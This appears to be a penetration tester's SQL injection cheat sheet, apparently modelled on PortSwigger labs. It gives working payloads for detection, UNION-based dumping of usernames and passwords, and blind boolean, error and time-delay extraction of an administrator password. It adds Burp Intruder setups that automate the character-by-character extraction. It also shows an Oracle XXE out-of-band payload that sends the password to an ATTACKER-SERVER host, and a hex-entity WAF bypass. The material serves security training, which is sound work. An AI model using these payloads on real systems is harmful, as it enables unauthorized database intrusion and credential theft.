![[SQLi.png]]
# Recon

The first step is to identify when the application is interacting with a backend database. Make a list of all input fields from the application that are potentially being used to create an SQL query and test each one of those fields separately.

After mapping out the application, the next steps will be to include specific SQL payloads to identify if the input fields are vulnerable to SQL injection. Some of those payloads can be:

Submit a single/double quote characters and look for errors or anomalies:

- `'`
- `"`
- `'--`
- `'#`

Submit SQL syntax that evaluates to the original value of the entry point, and a different value. Look for differences in application's response. An example could be string concatenation:

- `?parameter1=Accessorie'||'s`
- `?parameter1 = Accessorie'||wrongvalue`

Submit Boolean conditions and look for differences in the application's responses:

- `' or 1=1`
- `' or 1=2`
- `' and '1'='1`

Submit payloads that will trigger time delays and look for differences in the time it takes for the application to respond:

- `; select pg_sleep(10)`

Try using out-of-band exploitation techniques if none of the other techniques work (error-based, conditional-based, time-delays, union).
# Cheat Sheet

Depending on the database type, these payloads may be different.

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://pentestmonkey.net/cheat-sheet

Submit the following payload in the input fields and identify if there is any error messages or a notable difference from the original response:

- `'`

Submit the following payloads in the input fields. If there was an error message with the previous payload^, identify if it has gone away (these 2 payloads below, are meant to "fix" the current query statement to prevent any exceptions from occurring) or if there are any notable differences from original response:

- `'--`
- `''`

Submit the following payloads in the input fields. Identify if there is a notable difference from the original response. The (1=1) is equal to True, so the response size for these ones are usually larger than the (1=2) payload as that is equal to False.

- `' or 1=1--`
- `' or '1'='1`
- `' or 1=2--`
- `' or '1'='2`

Submit the following payloads in the input fields. Identify if there is a notable difference in the responses from (1=1) and (1=2). The key here is to determine how the application responds with True vs False statements.

For example, if the original response and the response from (1=1) payload are the same but when injecting the (1=2) payload there's a difference comparing to the original response, then the field may be susceptible to SQLi.

- `' and 1=1--`
- `' and '1'='1`
- `' and 1=2--`
- `' and '1'='2`

Another technique we can use to identify SQLi, is String Concatenation. For example, the original parameter/value may be as follows:

- `?category=Gifts`

Then, use string concatenation that will resolve to the original value:

- `?category=Gift'||'s`

Or use string concatenation that will not resolve to the original value:

- `?category=Gift'||'sss`

If the 1st and 2nd payloads result in the same response, but the 1st and 3rd don't, then the field may be vulnerable to SQLi. 

>[!info]
>Sometimes, the injected input may be reflected in the response. So, the response size may differ slightly even if they return the same data.

We can also inject Time-Delay payloads in the input fields. If the application has a notable delay in its response from the normal time, then the input field may be vulnerable to SQLi. For PostgreSQL:

```sql
; select pg_sleep(10)--
```

For Oracle DB:

```sql
'||(select dbms_pipe.receive_message(('a'),10) from dual)||'
```

For MySQL:

```sql
;select sleep(10)--
```

The following screenshots show different examples:

![[SQLi 1.png]]

![[SQLi 2.png]]

![[SQLi 3.png]]

![[SQLi 4.png]]

![[SQLi 5.png]]
# SQLi UNION Technique

This technique works if the results of the query are being returned in the response, if not Blind techniques will have to be used. First, we need to determine how the application responds to a valid vs invalid query. 

With this information we will be able to determine whether our injected payloads are valid or invalid.

First, determine how many columns are in the original query. The number of "nulls" injected needs to be adjusted:

```sql
' union select null, null--
```

Then, determine which columns returns string data:

```sql
' union select 'Test', null--
```

And extract table names from the database:

```sql
' union select table_name, null from information_schema.tables--
```

Then, extract column names from those tables:

```sql
' union select null,column_name from information_schema.columns where table_name = 'users'--
```

Finally, to retrieve multiple values in a single value (if needed):

```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
# SQLi Blind Conditional Response

Identify if the below payloads result in a notable difference in the responses. The key here is to know how the application responds to a true statement (1=1) vs a false statement (1=2):

- `' and '1'='1`
- `' and '1'='2`
- `' and 1=1--`
- `' and 1=2--`

Once we can identify how the application responds to a True vs False query, we can use the below payloads to extract useful information. Depending on the response we receive, we know that the query injected is either valid or invalid.

Even though UNION attacks won't do us any good here in Blind SQLi, this technique can still be used to enumerate table names:

For example, to enumerate table names:

```sql
'and (select 'a' from {tableName} limit 1)='a
```

```sql
'union select 'a' from {tableName} where 1=1--
```

You can also enumerate column names - the 2nd payload requires you to know at least 1 username on the database:

```sql
'union select {columnName} from users where 1=1--
```

```sql
'union select 'a' from users where {columnName}='administrator'--
```

For payloads to enumerate valid users that are in a column called username:

```sql
'and (select 'a' from users where username='{userName}')='a
```

For payloads to determine the length of a user's password - this uses a table called users and 2 columns called username and password:

```sql
' and (select 'a' from users where username='administrator' and length(password)>10)='a
```

And for payloads to extract the password of a user 1 character at a time:

```sql
' and (select substring(password,1,1) from users where username='administrator')='{character}
```

>[!info]
>Burp Intruder or the script in the "Scripts" folder can be used to help automate the extraction of password.

For Burp Intruder use the following configurations:

- Attack Type: Cluster Bomb
- Payload Positions: 2 position markers need to be set:
	- The first one should be on the character offset position in the password --> `...substring(password, $$, 1)`
	- The second marker should be on the actual character to test --> `...where username='administrator')='$$`
- Payloads
	- First marker - Numbers from 1 to 20
	- Second marker - include alphanumeric characters (Burp Pro has a payload list)

Then view the results and filter by the response length column or use the Grep function to search for the keyword. After sorting, it should be easy to manually put together the password.

>[!info]
>If having trouble sorting by 2 columns in Burp Suite. You can copy/paste only the necessary columns in an Excel sheet, sort them appropriately by the "Payload 1" request so they are in order (1-20) positions. Then use the =CONCAT() command on the "Payload 2" column so the password is combined automatically.
# SQL Blind Conditional Errors

Identify if the following 2 payloads result in a notable difference in the responses from the application:

- `' and 1=1--`
- `' and 1=0--`

Identify if the below payloads cause an SQL exception or error message. Dividing by zero may cause an exception:

- `' and to_char(1/1)=1--`
- `' and to_char(1/0)=1--`

Some payloads can be used to enumerate table names such as:

- `'||(select '' from {tableName} where rownum = 1)||'`
- `'union select 'a' from {tableName} where 1=1--`

Additionally, payloads can be used to determine if there is a user named administrator on the table called users. If the user exists, then an error (1/0) will result. Basically, if the query is valid then an exception will occur. If it is not valid, then the `"` will be executed:

```sql
'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
```

To determine the length of the password for a user called administrator use the following. If the password is greater than 20 characters, then an error (1/0) will result:

```sql
'||(select case when length(password)>20 then to_char(1/0) else '' end from users where username='administrator')||'
```

To extract the password of a user, use the below. For both payloads, if the character in the current position is correct, then the error (1/0) will execute:

For Oracle DB:

```sql
'||(select case when(substr((select password from users where username='administrator'),1,1)='z') then to_char(1/0) else '' end from dual)||'
```

```sql
'||(select case when substr(password,1,1)='z' then to_char(1/0) else '' end from users where username = 'administrator')||'
```

For Burp Intruder use the following configurations:

- Attack Type: Cluster Bomb
- Payload Positions: 2 position markers need to be set:
    - The first one should be on the character offset position in the password
    - The second marker should be on the actually character to test
        - `where username='administrator'),$$,1)='$$')`
- Payloads:
	- First marker - Numbers From 1 to 20
	- Second marker - include alphanumeric characters (Burp Pro has the payload list that can be added.)

Then, view the results and filter by status code. The results that contain the 500 code are the correct ones. After sorting, it should be easy to manually put together the password.
# Visible Error-Based SQL Injection

These payloads can be used when the application is returning a verbose error message in it's response. Many times the application will display the results of the query within the error message in the response.

Specifically the "cast" command enables us to convert one data type to another. Attempting to convert a String data type to an Integer will cause an error:

```sql
' and 1=cast((select 1) as int)--
```

```sql
' and 1=cast((select username from users) as int)--
```

```sql
' and 1=cast((select username from users limit 1) as int)--
```

```sql
' and 1=cast((select password from users limit 1) as int)--
```
# SQLi Blind Time Delays

Make sure to encode:

- `;` -> `%3b`

Identify if any of the below payloads cause a time delay on the application's response. Portswigger has a cheat sheet that has more:

```sql
'||(select dbms_pipe.receive_message(('a'),10) from dual)||'
```

```sql
'%3b select sleep(10)--
```

```sql
'%3b select pg_sleep(10)--
```

In this example if the table users does exist then the application will sleep, if it doesn't exist then the application should respond normally. The following can be used to enumerate valid tables in the database:

```sql
'%3b select case when (1=1) then pg_sleep(10) else null end from users-- 
```

The next payload can be used to identify if a user called administrator exists on the table called users:

```sql
'%3b select case when (username='administrator') then pg_sleep(10) else pg_sleep(0) end from users--
```

```sql
'%3b select case when ((select 'TEST' from users where username='administrator')='TEST') then pg_sleep(10) else null end--
```

To identify the length of the password for a user called administrator:

```sql
'%3b select case when (username='administrator' and length(password)>1) then pg_sleep(10) else pg_sleep(0) end from users--
```

```sql
'%3b select case when ((select 'TEST' from users where username='administrator' and length(password)>10)='TEST') then pg_sleep(10) else null end--
```

To extract the password from a user called administrator - the columns here are username and password and the table is users:

```sql
'%3b select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(0) end from users--
```

```sql
'%3b select case when (substring((select password from users where username ='administrator'),1,1)='f') then pg_sleep(10) else null end--
```

For Burp Intruder use the following configurations:

- Attack Type: Cluster Bomb
- Payload Positions: 2 position markers need to be set:
    - The first one should be on the character offset position in the password
    - The second marker should be on the actually character to test:
        - `where username='administrator'),$$,1)='$$')`
- Payloads:
    - First marker - Numbers From 1 to 20
    - Second marker - include alphanumeric characters (Burp Pro has the payload list that can be added.)

Filter by the Response received/completed columns. The higher values should have the correct character in their positions. After sorting, it should be easy to manually put together the password.
# SQLi Out of Band Interaction

Here we are using a method called extractvalue(), that takes in a XML type instance and XPath expression(this argument doesn't matter much it just needs to be there to execute correctly). An XXE payload using a parameter entity called remote is used, that will reach out to the attacker server.

For Oracle DB:

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
```

The decoded version is:

```sql
' UNION SELECT extractvalue(
xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER/"> %remote;]>
')
,'/1') 
FROM dual--
```

To extract data, we can use a method called extractvalue(), that takes in a XML type instance and XPath expression(this argument doesn't matter much it just needs to be there to execute correctly). An XXE payload using a parameter entity called remote is used, that will reach out to our attacker server. The application will evaluate the SQL query before the XXE payload is executed.

For Oracle DB:

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
```

The decoded version is:

```sql
' UNION SELECT extractvalue(
xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.ATTACKER-SERVER/"> %remote;]>
')
,'/1') 
FROM dual--
```
# SQLi with Filter Bypass via XML Encoding

SQL injection vectors can exist in other areas of the application such as JSON or XML inputs. This can allows us to obfuscate the payloads in different ways to bypass filters. For example:

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

>[!info]
>Use the "Hackvertor" extension from Burp to help encode the payload and bypass any WAF via Hackvertor --> Encode --> hex_entities.

```xml
<storeId>
<@hex_entities>
1 UNION SELECT username || '~' || password FROM users
<@/hex_entities>
</storeId>
```
